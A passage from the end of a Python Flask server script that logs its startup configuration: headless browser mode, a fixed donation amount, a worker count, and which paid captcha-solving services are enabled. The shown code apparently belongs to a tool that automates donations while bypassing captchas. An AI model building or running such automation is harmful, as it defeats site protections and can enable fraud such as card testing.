    port = int(os.environ.get('PORT', 8080))
    debug = os.environ.get('FLASK_ENV', 'production') == 'development'
    
    logger.info(f"🚀 Server starting on port {port}")
    logger.info(f"🔧 Config:")
    logger.info(f"   Headless: {HEADLESS}")
    logger.info(f"   Donation amount: ${DONATION_AMOUNT}")
    logger.info(f"   Max workers: {MAX_WORKERS}")
    
    # Mostrar estado de servicios de captcha
    if API_KEY_2CAPTCHA:
        logger.info(f"   2Captcha: ✅ ENABLED")
    if API_KEY_ANTICAPTCHA:
        logger.info(f"   AntiCaptcha: ✅ ENABLED")
    if API_KEY_CAPSOLVER:
        logger.info(f"   CapSolver: ✅ ENABLED")
    
    if not any([API_KEY_2CAPTCHA, API_KEY_ANTICAPTCHA, API_KEY_CAPSOLVER]):
        logger.warning(f"   Captcha Services: ⚠️ NONE configurado - Los captchas no se resolverán")
    
    app.run(host='0.0.0.0', port=port, debug=debug)